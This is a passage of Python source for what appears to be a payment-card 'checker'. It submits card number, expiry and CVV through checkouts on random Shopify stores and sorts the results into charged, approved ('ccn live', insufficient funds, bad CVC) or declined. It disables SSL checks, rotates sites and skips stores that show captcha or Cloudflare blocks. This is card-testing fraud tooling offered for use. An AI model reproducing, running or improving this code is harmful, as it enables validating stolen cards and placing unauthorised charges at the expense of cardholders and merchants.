    return f"Error - All sites failed [{elapsed}s]"


APPROVED_KEYWORDS = [
    "3ds", "3d_auth", "3ds_authentication", "3d_authentication",
    "three_d_secure", "3d secure", "3ds_required", "3ds required",
    "authentication_required", "requires_action",
    "insufficient", "ccn live", "invalid_cvc", "incorrect_cvc",
    "invalid_cvv", "incorrect_cvv", "incorrect_zip", "insufficient funds",
    "card approved", "transaction approved", "success",
]
CHARGED_KEYWORDS = ["thank you", "payment successful", "payment succeeded", "charged"]

SKIP_RESPONSES = (
    "No session token", "Site requires login", "No products available",
    "No shipping available", "Domain not found", "SSL error", "Connection timeout",
    "Site is password protected", "Product unavailable", "Checkout page timeout",
    "Card vault failed", "Negotiation failed: NegotiationResultFailed",
    "Checkpoint Denied - Skipping",
)

DEAD_INDICATORS = [
    "receipt id is empty", "handle is empty", "product id is empty",
    "tax amount is empty", "r4 token empty", "del ammount empty",
    "invalid json format or missing", "item is out of stock", "token empty",
    "id empty", "r2 id empty", "hcaptcha detected", "clinte token",
    "py id empty", "tax ammount empty", "invalid_toke", "bad site",
    "delivery ammount empty", "r3 token empty",
    "payment method identifier is empty", "invalid url",
    "error in 1st req", "error in 1 req", "cloudflare", "failed",
    "connection failed", "timed out", "access denied", "tlsv1 alert",
    "ssl routines", "could not resolve", "domain name not found",
    "name or service not known", "openssl ssl_connect",
    "empty reply from server", "http_error_504", "http error",
    "gateway timeout", "internal server error",
    "service unavailable", "bad gateway",
]


def _is_skip_response(amount, response):
    if amount is not None:
        return False
    if response in SKIP_RESPONSES:
        return True
    if response and response.startswith("Connection error"):
        return True
    resp_lower = (response or "").lower()
    if any(ind in resp_lower for ind in DEAD_INDICATORS):
        return True
    return False


def _classify_shopify_response(amount, response, gw_name, site, elapsed):
    gateway_name = gw_name or "Shopify Payments"
    clean_site = site.replace("https://", "").replace("http://", "").rstrip("/")
    site_url = f"https://{clean_site}"

    if amount is None:
        return {
            "status": "error",
            "response": response or "Unknown error",
            "gateway": gateway_name,
            "amount": None,
            "site": site_url,
            "elapsed": elapsed,
        }

    resp_lower = (response or "").lower()

    if response == "Approved" or any(k in resp_lower for k in CHARGED_KEYWORDS):
        status = "charged"
        resp_text = "Charged" if response == "Approved" else response
    elif any(k in resp_lower for k in APPROVED_KEYWORDS):
        status = "approved"
        resp_text = response
    else:
        status = "declined"
        resp_text = response

    return {
        "status": status,
        "response": resp_text,
        "gateway": gateway_name,
        "amount": amount,
        "site": site_url,
        "elapsed": elapsed,
    }


async def shopify_native_check_rich(cc, mm, yy, cvv, site=None, progress_cb=None):
    start = time.time()

    _Session = ChromeSession if ChromeSession else aiohttp.ClientSession

    if site:
        clean_site = site.replace("https://", "").replace("http://", "").rstrip("/")
        try:
            async with _Session(
                timeout=aiohttp.ClientTimeout(total=90),
                connector=aiohttp.TCPConnector(ssl=False),
            ) as session:
                amount, response, gw_name = await _shopify_check(session, clean_site, cc, mm, yy, cvv, progress_cb=progress_cb)
                elapsed = round(time.time() - start, 2)

                if _is_skip_response(amount, response):
                    return {
                        "status": "dead_site",
                        "response": response,
                        "gateway": gw_name or "Shopify Payments",
                        "amount": None,
                        "site": f"https://{clean_site}",
                        "elapsed": elapsed,
                    }

                return _classify_shopify_response(amount, response, gw_name, clean_site, elapsed)
        except asyncio.TimeoutError:
            elapsed = round(time.time() - start, 2)
            return {"status": "dead_site", "response": "Timeout", "gateway": "Shopify Payments", "amount": None, "site": f"https://{clean_site}", "elapsed": elapsed}
        except Exception as e:
            elapsed = round(time.time() - start, 2)
            return {"status": "error", "response": str(e), "gateway": "Shopify Payments", "amount": None, "site": f"https://{clean_site}", "elapsed": elapsed}

    sites = SHOPIFY_SITES.copy()
    random.shuffle(sites)

    for s in sites[:5]:
        try:
            async with _Session(
                timeout=aiohttp.ClientTimeout(total=90),
                connector=aiohttp.TCPConnector(ssl=False),
            ) as session:
                amount, response, gw_name = await _shopify_check(session, s, cc, mm, yy, cvv, progress_cb=progress_cb)
                elapsed = round(time.time() - start, 2)

                if _is_skip_response(amount, response):
                    continue

                return _classify_shopify_response(amount, response, gw_name, s, elapsed)

        except asyncio.TimeoutError:
            continue
        except Exception:
            continue

    elapsed = round(time.time() - start, 2)
    return {
        "status": "error",
        "response": "All sites failed",
        "gateway": "Shopify Payments",
        "amount": None,
        "site": "",
        "elapsed": elapsed,
    }
